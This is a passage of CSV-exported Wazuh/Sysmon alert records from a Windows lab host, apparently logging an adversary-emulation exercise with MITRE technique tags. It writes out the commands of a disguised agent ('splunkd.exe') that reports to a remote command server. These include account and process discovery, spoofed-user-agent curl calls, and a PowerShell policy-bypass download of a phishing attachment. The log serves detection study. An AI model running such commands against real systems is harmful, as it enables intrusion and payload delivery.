ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:41.582591600Z,53975,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,6,false,3,A net.exe account discovery command was initiated,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92039, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:42.617",EventChannel,1732947702.347554,"Nov 30, 2024 @ 06:21:42.617", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,2384, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF5-674A-2D05-000000000D00},2024-11-30 06:21:41.582,"SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-AEF5-674A-2B05-000000000D00},net user guest,0x3e7,4120,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 user guest,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,q_q7e5MBRlc-D5DFeBy4,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1087.001,technique_name=Local Account
UtcTime: 2024-11-30 06:21:41.658
ProcessGuid: {15959494-AEF5-674A-3105-000000000D00}
ProcessId: 2936
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net user guest
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:41.659517400Z,53978,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,9,false,3,A net.exe account discovery command was initiated,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92039, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:42.668",EventChannel,1732947702.365350,"Nov 30, 2024 @ 06:21:42.668", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,2936, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF5-674A-3105-000000000D00},2024-11-30 06:21:41.658,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1087.001,technique_name=Local Account",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net user guest,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,8_rSe5MBRlc-D5DFqB02,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 06:46:55.455
ProcessGuid: {15959494-B4DF-674A-B905-000000000D00}
ProcessId: 1944
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -s -A ""HttpBrowser/1.0"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""*<|>*"" -m3 www.google.com >nul 2>&1
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:46:55.458269900Z,54399,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:46:56.541",EventChannel,1732949216.849710,"Nov 30, 2024 @ 06:46:56.541", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,1944, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-B4DF-674A-B905-000000000D00},2024-11-30 06:46:55.455,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C C:\\Windows\\System32\\Curl.exe -s -A \""HttpBrowser/1.0\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Wget/1.9+cvs-stable (Red Hat modified)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""*&lt;|&gt;*\"" -m3 www.google.com &gt;nul 2&gt;&amp;1",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,9vrSe5MBRlc-D5DFqB02,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1105,technique_name=Ingress Tool Transfer
UtcTime: 2024-11-30 06:46:56.852
ProcessGuid: {15959494-B4E0-674A-BC05-000000000D00}
ProcessId: 8172
Image: C:\Windows\System32\curl.exe
FileVersion: 7.55.1
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.haxx.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB
ParentProcessGuid: {15959494-B4DF-674A-B905-000000000D00}
ParentProcessId: 1944
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -s -A ""HttpBrowser/1.0"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 www.google.com >nul 2>&1 && C:\Windows\System32\Curl.exe -s -A ""*<|>*"" -m3 www.google.com >nul 2>&1
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:46:56.853536900Z,54404,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,6,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:46:57.559",EventChannel,1732949217.872558,"Nov 30, 2024 @ 06:46:57.559", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,8172, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,curl.exe,C:\\Windows\\System32\\curl.exe,The curl executable, , ,The curl executable, , ,{15959494-B4E0-674A-BC05-000000000D00},2024-11-30 06:46:56.852,"SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB","technique_id=T1105,technique_name=Ingress Tool Transfer","curl, https://curl.haxx.se/",7.55.1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B4DF-674A-B905-000000000D00},"cmd.exe /C C:\\Windows\\System32\\Curl.exe -s -A \""HttpBrowser/1.0\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Wget/1.9+cvs-stable (Red Hat modified)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com &gt;nul 2&gt;&amp;1 &amp;&amp; C:\\Windows\\System32\\Curl.exe -s -A \""*&lt;|&gt;*\"" -m3 www.google.com &gt;nul 2&gt;&amp;1",0x107a6b,1944,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"C:\\Windows\\System32\\Curl.exe  -s -A \""Opera/8.81 (Windows NT 6.0; U; en)\"" -m3 www.google.com",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,3PrKe5MBRlc-D5DFQx2w,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 06:37:45.537
ProcessGuid: {15959494-B2B9-674A-A205-000000000D00}
ProcessId: 5916
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:37:45.539554100Z,54224,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:37:46.617",EventChannel,1732948666.782448,"Nov 30, 2024 @ 06:37:46.617", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5916, , , , , , , , , , ,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-B2B9-674A-A205-000000000D00},2024-11-30 06:37:45.537,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,3frKe5MBRlc-D5DFQx2w,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:37:45.616
ProcessGuid: {15959494-B2B9-674A-A205-000000000D00}
ProcessId: 5916
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ep5tqmu1.wb4.ps1
CreationUtcTime: 2024-11-30 06:37:45.616
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:37:45.626153300Z,54233,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,9,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:37:46.750",EventChannel,1732948666.789816,"Nov 30, 2024 @ 06:37:46.750", , , , , , , , , , , , ,5916, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B2B9-674A-A205-000000000D00},2024-11-30 06:37:45.616, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ep5tqmu1.wb4.ps1,2024-11-30 06:37:45.616, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,APrVe5MBRlc-D5DFZx5e,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution
UtcTime: 2024-11-30 06:49:54.109
ProcessGuid: {15959494-B592-674A-C605-000000000D00}
ProcessId: 8108
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
FileVersion: 4.8.3761.0 built by: NET48REL1
Description: Visual C# Command Line Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: csc.exe
CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\mari\AppData\Local\Temp\4ll14l30\4ll14l30.cmdline""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=93CF877F5627E55EC076A656E935042FAC39950E,MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D
ParentProcessGuid: {15959494-B591-674A-C505-000000000D00}
ParentProcessId: 3880
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:49:54.127562500Z,54449,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,6,"Powershell script compiling code using CSC.exe, possible malware drop","[""sysmon"",""sysmon_eid1_detections"",""windows""]",92006, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:49:55.000",EventChannel,1732949395.920064,"Nov 30, 2024 @ 06:49:55.000", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,8108, , , , , , , , , , ,"[""Compile After Delivery""]","[""T1027.004""]","[""Defense Evasion""]", , , ,csc.exe,C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe,Microsoft® .NET Framework, , ,Visual C# Command Line Compiler, , ,{15959494-B592-674A-C605-000000000D00},2024-11-30 06:49:54.109,"SHA1=93CF877F5627E55EC076A656E935042FAC39950E,MD5=23EE3D381CFE3B9F6229483E2CE2F9E1,SHA256=4240A12E0B246C9D69AF1F697488FE7DA1B497DF20F4A6F95135B4D5FE180A57,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D","technique_id=T1127,technique_name=Trusted Developer Utilities Proxy Execution",Microsoft Corporation,4.8.3761.0 built by: NET48REL1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B591-674A-C505-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop\""",0x107a6b,3880,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\mari\\AppData\\Local\\Temp\\4ll14l30\\4ll14l30.cmdline\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,5vrOe5MBRlc-D5DFsB2H,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1057,technique_name=Process Discovery
UtcTime: 2024-11-30 06:42:40.682
ProcessGuid: {15959494-B3E0-674A-AD05-000000000D00}
ProcessId: 5620
Image: C:\Windows\System32\tasklist.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Lists the current running tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: tasklist.exe
CommandLine: tasklist.exe  
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=46E746E7DC338947F564FC8618C83F039B09A7F8,MD5=B12E0F9C42075B4B7AD01D0B6A48485D,SHA256=ECF9258BBEB3DE78CED7FE1C7CDBEB2D2EB41EC4D6A4A9D5F0F805F69850D0FA,IMPHASH=DCE1F3B1BD09BBAD166CE65677E33EDB
ParentProcessGuid: {15959494-B3E0-674A-AC05-000000000D00}
ParentProcessId: 6568
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C tasklist.exe && sc query && sc query state= all
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T06:42:40.684380100Z,54334,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:42:41.758",EventChannel,1732948961.814114,"Nov 30, 2024 @ 06:42:41.758", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5620, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,tasklist.exe,C:\\Windows\\System32\\tasklist.exe,Microsoft® Windows® Operating System, , ,Lists the current running tasks, , ,{15959494-B3E0-674A-AD05-000000000D00},2024-11-30 06:42:40.682,"SHA1=46E746E7DC338947F564FC8618C83F039B09A7F8,MD5=B12E0F9C42075B4B7AD01D0B6A48485D,SHA256=ECF9258BBEB3DE78CED7FE1C7CDBEB2D2EB41EC4D6A4A9D5F0F805F69850D0FA,IMPHASH=DCE1F3B1BD09BBAD166CE65677E33EDB","technique_id=T1057,technique_name=Process Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-B3E0-674A-AC05-000000000D00},cmd.exe /C tasklist.exe &amp;&amp; sc query &amp;&amp; sc query state= all,0x107a6b,6568,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,tasklist.exe,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,2_rJe5MBRlc-D5DFRR27,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:36:43.597
ProcessGuid: {15959494-B27B-674A-A105-000000000D00}
ProcessId: 4916
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_xapfhl1r.onr.ps1
CreationUtcTime: 2024-11-30 06:36:43.597
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:36:43.612256400Z,54215,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,8,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:36:44.731",EventChannel,1732948604.779438,"Nov 30, 2024 @ 06:36:44.731", , , , , , , , , , , , ,4916, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B27B-674A-A105-000000000D00},2024-11-30 06:36:43.597, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xapfhl1r.onr.ps1,2024-11-30 06:36:43.597, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
